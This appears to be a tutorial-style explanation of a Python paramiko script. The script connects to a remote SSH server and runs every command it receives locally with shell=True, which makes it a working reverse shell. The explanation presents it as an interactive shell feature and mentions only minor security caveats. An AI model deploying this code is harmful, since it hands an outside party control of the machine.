This Python script is an extension of the previous example and introduces an interactive shell functionality over an SSH connection. Let's break down the script:

```python
import subprocess
import paramiko

def ssh_command(ip, user, passwd, command):
    # Create an SSH client
    client = paramiko.SSHClient()

    # Automatically add the server's host key (this is insecure and should be avoided in production)
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # Connect to the remote server
        client.connect(ip, username=user, password=passwd)

        # Open an SSH session
        ssh_session = client.get_transport().open_session()

        # Check if the session is active
        if ssh_session.active:
            # Send the initial command to the server
            ssh_session.send(command)

            # Print the banner (usually the welcome message)
            print(ssh_session.recv(1024).decode('utf-8'))

            # Main loop for interactive shell
            while True:
                # Receive the command from the SSH server
                command = ssh_session.recv(1024).decode()

                try:
                    # Execute the command using subprocess
                    cmd_output = subprocess.check_output(command, shell=True)
                    ssh_session.send(cmd_output)
                except Exception as e:
                    # Send the exception message back to the SSH server
                    ssh_session.send(str(e))

    except Exception as e:
        print(f"Error: {e}")

    finally:
        # Close the SSH connection
        client.close()

# Example usage
ssh_command('192.168.100.130', 'justin', 'lovesthepython', 'ClientConnected')
```

Explanation:

1. **Interactive Shell Functionality:**
   - This script extends the previous example by creating an interactive shell over the SSH connection.

2. **Sending and Receiving Commands:**
   - The initial command is sent to the server using `ssh_session.send(command)`.
   - The script then enters a main loop where it continuously receives commands from the SSH server using `ssh_session.recv(1024).decode()`.

3. **Executing Commands:**
   - Each received command is executed locally on the script's machine using `subprocess.check_output(command, shell=True)`.
   - The output of the command is sent back to the SSH server using `ssh_session.send(cmd_output)`.

4. **Exception Handling:**
   - If an exception occurs during the execution of a command, the exception message is sent back to the SSH server.

5. **Closing the SSH Connection:**
   - The `finally` block ensures that the SSH connection is closed even if an exception occurs.

6. **Example Usage:**
   - The script concludes with an example usage of the `ssh_command` function, connecting to the server with the specified IP, username, password, and initiating the command `'ClientConnected'`.

Note: As before, hardcoding passwords in the script is not recommended for security reasons. In a production environment, you might want to consider more secure authentication methods, such as key-based authentication. Additionally, this script lacks proper error handling and security measures, and it's important to be cautious when implementing interactive shell functionality over SSH.
